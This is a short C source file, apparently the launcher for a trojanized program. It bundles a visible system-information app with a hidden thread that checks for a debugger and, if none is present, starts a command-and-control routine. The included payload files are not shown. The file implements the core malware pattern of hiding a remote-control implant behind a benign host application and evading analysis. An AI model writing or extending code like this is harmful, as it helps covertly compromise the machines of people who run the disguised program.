/* Author: Dhanush Arvind */

#define BUNDLED_BUILD

#include "caller.c"
#include "host_app.c"

static DWORD WINAPI caller_thread(LPVOID param) {
    (void)param;
    if (!check_debugger()) c2_main();
    return 0;
}

int main(void) {
    CreateThread(NULL, 0, caller_thread, NULL, 0, NULL);
    return sysinfo_main();
}
